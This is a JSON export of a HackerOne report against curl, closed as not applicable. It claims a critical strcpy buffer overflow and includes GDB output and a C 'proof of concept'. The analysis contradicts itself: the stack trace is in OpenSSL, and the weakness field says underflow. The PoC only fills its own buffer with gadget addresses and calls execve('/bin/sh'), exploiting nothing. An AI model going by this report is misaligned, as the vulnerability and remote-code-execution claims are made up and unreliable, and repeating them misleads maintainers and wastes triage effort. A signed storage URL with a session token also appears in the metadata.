@@ -1,0 +1,127 @@
+{
+  "id": 2823554,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODIzNTU0",
+  "url": "https://hackerone.com/reports/2823554",
+  "title": "Buffer overflow in strcpy",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "critical",
+  "readable_substate": "N/A",
+  "created_at": "2024-11-06T01:50:15.925Z",
+  "submitted_at": "2024-11-06T01:50:16.189Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "rootgh0st",
+    "url": "/rootgh0st",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/287oppf1ovpenejrnlksredvxv0k/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-11-07T17:36:54.461Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2024-11-06T12:13:19.676Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Buffer Overflow Exploit Analysis**\n\nThe vulnerability in the program is a classic case of a buffer overflow, triggered by the unsafe use of the `strcpy()` function, which lacks bounds checking. The following section describes the vulnerability, how the return address is overflowed, and how the exploit works to achieve remote code execution.\n\n**Vulnerable Function:**\n\nThe vulnerability occurs due to the use of `strcpy()` in the program, which copies data from a source buffer to a destination buffer without verifying that the destination buffer is large enough to hold the incoming data. If the input string is larger than the allocated buffer size, it results in a buffer overflow, which can lead to arbitrary memory overwrites.\n\n**Stack Trace and Buffer Overflow Location:**\n\nThe overflow happens when the `strcpy()` function is called. Here's the relevant stack trace from GDB, showing the function call sequence:\n\n```\n#0  __strcpy_evex () at ../sysdeps/x86_64/multiarch/strcpy-evex.S:94\n#1  0x00007ffff765d2cd in CRYPTO_strdup () from /lib/x86_64-linux-gnu/libcrypto.so.3\n#2  0x00007ffff756ef96 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3\n#3  0x00007ffff7570103 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3\n#4  0x00007ffff7571ef9 in CONF_modules_load_file_ex () from /lib/x86_64-linux-gnu/libcrypto.so.3\n#5  0x00007ffff75722c8 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3\n#6  0x00007ffff765a98f in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3\n#7  0x00007ffff7d51087 in __pthread_once_slow (once_control=0x7ffff7981498, init_routine=0x7ffff765a980)\n    at ./nptl/pthread_once.c:116\n```\n\nthe buffer overflow happens in the curl program, not OpenSSL. The strcpy() or similar function (depending on the code you're working with) in curl is the main cause of the vulnerability, and OpenSSL just happens to be part of the stack trace because curl uses OpenSSL for cryptographic functions.\n\n**Registers at the Breakpoint:**\n\nAt the point where the overflow occurs, checking the CPU registers, which show that the `rip` (Instruction Pointer) is at `0x7ffff7e31b80`, inside the `__strcpy_evex` function. Here's the relevant register information:\n\n```\nrax            0x472cf0            4664560\nrbx            0x7ffff7832be3      140737345956835\nrcx            0x472cf0            4664560\nrdx            0x472cf0            4664560\nrsi            0x7ffff7832be3      140737345956835\nrdi            0x472cf0            4664560\nrbp            0x7ffff7832b3d      0x7ffff7832b3d\nrsp            0x7fffffffd988      0x7fffffffd988\nrip            0x7ffff7e31b80      0x7ffff7e31b80 <__strcpy_evex>\n```\n\nThe key point here is that the program is executing within the `__strcpy_evex` function, which is responsible for copying the string. If the source string exceeds the buffer size, it causes an overflow that allows us to overwrite adjacent memory, such as the return address.\n\n**Memory at the Overflow Location:**\n\nNext, we examined the stack memory using the `x/40x $rsp` GDB command. This allowed us to inspect the contents of the stack and identify where the return address is located:\n\n```\n0x7fffffffd988: 0xf765d2cd      0x00007fff      0x00464a60      0x00000000\n0x7fffffffd998: 0x00472aa0      0x00000000      0x00000000      0x00000000\n0x7fffffffd9a8: 0xf756ef96      0x00007fff      0x00000019      0x00000000\n0x7fffffffd9b8: 0x79a81a00      0x206eedee      0xf7832b3d      0x00007fff\n0x7fffffffd9c8: 0x00472a70      0x00000000      0x00472aa0      0x00000000\n0x7fffffffd9d8: 0x00472cc0      0x00000000      0x00000000      0x00000000\n0x7fffffffd9e8: 0xf766ea3d      0x00007fff      0x00000000      0x00000000\n0x7fffffffd9f8: 0x00000000      0x00000000      0xf7959ec0      0x00007fff\n0x7fffffffda08: 0xf766e9dd      0x00007fff      0x00000019      0x00000000\n0x7fffffffda18: 0xf765a09f      0x00007fff      0x00464a60      0x00000000\n```\n\nIn this dump, the return address that gets overwritten is located in the memory at `0x7fffffffd9b8` (the return address from the function call). By overflowing the buffer, we can overwrite this return address with a controlled value.\n\n**What is Being Overflowed:**\n\nThe buffer that is overflowed is used by the `strcpy()` function to copy user-supplied data. Specifically, the buffer that holds the input string is located on the stack, and the buffer size is not checked before data is copied. This allows an attacker to overflow the buffer and overwrite critical parts of the stack, such as the return address.\n\n**Key Target for Overwriting:**\n- **Return Address:** The return address of the current function (`0x4005d0`) is overwritten. This is the address that the program will jump to once the current function completes. By modifying this return address, the attacker can control where the program jumps next.\n\n**Exploit Strategy:**\n\nThe goal of the exploit is to overwrite the return address to redirect the program's control flow to an attacker-controlled location. Here’s how the exploit works:\n\n1. **Fill the Buffer:** The attacker provides a large string (e.g., filled with \"A\"s) that is longer than the buffer size, causing the `strcpy()` function to overflow the buffer.\n   \n2. **Overwrite the Return Address:** As the attacker continues to fill the buffer with data, they eventually overwrite the return address with the address `0x4005d0`, which points to the shell-spawning function.\n\n3. **Redirect Control Flow:** Once the buffer overflows and the return address is overwritten, the program will return to the address specified (in this case, `0x4005d0`). This address should point to a function like `system(\"/bin/sh\")`, which will execute a shell for the attacker.\n\nBy achieving this, the attacker is able to execute arbitrary code and gain control of the program, typically leading to remote code execution or other security compromises.\n\n**Conclusion:**\n\nThe buffer overflow vulnerability in this program allows for the arbitrary overwriting of the return address on the stack. By exploiting this vulnerability, an attacker can redirect the program’s execution to arbitrary code, effectively gaining control of the system. The specific return address (`0x4005d0`) was identified as the target for redirection, leading to the execution of a malicious payload.\n\nPOC CODE IN C:\n\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <stdlib.h>\n\n#define OFFSET 40  \n#define SYSTEM 0x4f440  // Address of system() in libc\n#define BIN_SH 0x1b3e9a  // Address of the string \"/bin/sh\" in libc\n#define POP_RDI_RET 0x4006f3  // Address of 'pop rdi; ret' gadget \n#define RET 0x4005d0  // Address of a 'ret' gadget \n\n// Function to perform the buffer overflow and spawn a shell\nvoid exploit() {\n    char buffer[128];  // Create a buffer to simulate the overflow\n\n    // Step 1: Construct the payload. Start by filling the buffer with 'A's to reach the return address.\n    memset(buffer, 'A', OFFSET);  // Filling the buffer with 'A' until we reach the return address\n    printf(\"[ * ] Buffer filled with 'A's, length: %d\\n\", OFFSET);\n\n    // Step 2: Overwrite the return address with the address of a 'pop rdi; ret' gadget.\n    *((unsigned long*)(buffer + OFFSET)) = POP_RDI_RET;  // This gadget will let us control the first argument of execve()\n    printf(\"[ * ] POP_RDI_RET address: 0x%lx\\n\", POP_RDI_RET);\n\n    // Step 3: Overwrite the second address with the location of the string \"/bin/sh\" in libc (the argument for execve).\n    *((unsigned long*)(buffer + OFFSET + 8)) = BIN_SH;  // \"/bin/sh\" is passed as the first argument to execve()\n    printf(\"[ * ] BIN_SH address: 0x%lx\\n\", BIN_SH);\n\n    // Step 4: Overwrite the third address with the address of the system() function in libc.\n    *((unsigned long*)(buffer + OFFSET + 16)) = SYSTEM;  // Calling system(\"/bin/sh\")\n    printf(\"[ * ] SYSTEM address: 0x%lx\\n\", SYSTEM);\n\n    // Step 5: Add a return address to deal with stack alignment issues, use a ret gadget.\n    *((unsigned long*)(buffer + OFFSET + 24)) = RET;  // Ensures stack is properly aligned and continues execution\n    printf(\"[ * ] RET address: 0x%lx\\n\", RET);\n\n    // Step 6: Send the payload to the vulnerable program (in this case, we simulate it using execve()).\n    printf(\"[ * ] Sending payload...\\n\");\n\n    // Use execve() to directly execute the payload\n    char *args[] = { \"/bin/sh\", NULL };\n    execve(\"/bin/sh\", args, NULL);  // This directly executes \"/bin/sh\" with null-terminated arguments\n\n    // Debugging message for any potential issues with execve()\n    perror(\"execve() failed\");\n}\n\n// Main function that starts the exploit\nint main() {\n    printf(\"[ * ] Launching exploit, waiting for shell..\\n\");\n    exploit();  // Call the exploit function to trigger the overflow and spawn the shell\n    return 0;  // Return from main, though execution should not reach here if the shell is spawned successfully\n}\n\n## Impact\n\nCode execution, command shell, possible system take over from this compromise...",
+  "weakness": {
+    "id": 7,
+    "name": "Buffer Underflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3737445,
+      "file_name": "curlexploit.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9ty6awxd73x4ldkl4exxibm93ky2?response-content-disposition=attachment%3B%20filename%3D%22curlexploit.jpg%22%3B%20filename%2A%3DUTF-8%27%27curlexploit.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT5KRIUIB%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T150244Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIEHV8zCFLyJB6KIJX9tB1RS3FI0Drzztv4FJrx6gYAMmAiEA%2FEgkng1Z3j8HVZ%2F5aHGm4OkJU9HZRWZMcIiKfHC1NXwqugUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLuToQaaRyrazCg1XiqOBfza%2B59IoaeU2wLPK3q%2BMcz%2FnrJyz3yNpBfjxjHZEku1YzbN6WwLtZ0mndnVNwGw6hQFtwEnQpv2ppYD%2F0X2KRZP1Fu0UYCFK4Q27b4qlWIylC%2Fbhsdsu0bdzppqokEh%2FFXmE47HH%2FTXVlXbDuRRI53nOymMuQPE28fWjHgvGkJptUNGGutap74gl1%2B8mKqO9e%2BYMUTgaEPu%2FrHqtyj%2B%2BfNS67VxeBNMTblj2HEhbY9ktTNc1nRY6Z0PeWs%2BQk%2BIImJTkPtWJQnXohmMjIBdhMe%2BemGdMDG4T%2FJzcqvFjjWZLyI0445CtGroL25RL8dz2mm8In00t9aUDywnrYM2p4BRpcgyK1xtTlf4PP8WJfBzxIuoFeSTnZs1Xg7rxqTSw%2Bb88hclyBCq8%2FDjdryxsVSTZSrWXAE4WS3L0Cc1Hk8GenLA4PkQN61UpOrCFQDaTJeqV63TV1pIBmAhfCRORzoKohxp1aUbhgvhfHZhKi1%2B%2F%2BqbvClz3%2F95uIFQje2HawIRTm0%2Fwe9RhSAVOGug33glWSmlAPWOJxvuyTtSSUBoqFy0cu%2BCXM8XqbdBqDiafTYJtil%2Bwn%2BoLFXGI7p8ls1hpTAFmHOOn0yV%2FKzg%2Fk5x%2BYerSXNrq7gjwx%2FVxS7%2FsYVSWELq833psEY7FFgTZjqhghQEE5CnoR2QwzB6%2Fq1CPI2P46OhmnlaegadV6XTBjJRsiLer59jGw7iO9okW3Vtb9Q54KjXih9%2BphmJy2kayQ75K%2BJYSkYUuPynuH8soQ8XFGc46vlti85HRICdiOl%2Ft55ZL%2FdOq1LFJXQXHdWQ5jiirR2%2BahP5z146NaV6BqA5IrZOlAQ88raRikpdof%2BLk8zQt83nE2RY%2FBWUfjDQkP3PBjqxAawKMjCvVekDkhDpOPsN6jVcVAs4TRnjOLDlscpEybQrOgJ0Oc7WllK14qGzOUzdQBmDc4vKdW3T%2F%2FRlQkjtMTew2Vzgli82a3myGHp0cLQbXaZU0rrB%2BSb8uLG%2Fdf0CW4nDrhFadGREJk3xXcpHt5KZQ0ODQw45jzZQ4tuVly4L6uXe7lSLwGyIbN6qN2AOaE0cGB2cPDi2FtJJEdlmuvopgBAuhBEK7d2DLNck4XkZ2g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=098b364ad0aacb34a42736d5a8fc243221b2dc4c0e0d1b0ec64bcedd0d09295e",
+      "file_size": 5674769,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 52,
+  "voters": [
+    "nox1024",
+    "hexpwn",
+    "nimbusedge",
+    "eslam11x",
+    "maskopatol",
+    "alp",
+    "raslanco",
+    "dukrov",
+    "jmo740",
+    "x0_h0nda",
+    "and 42 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
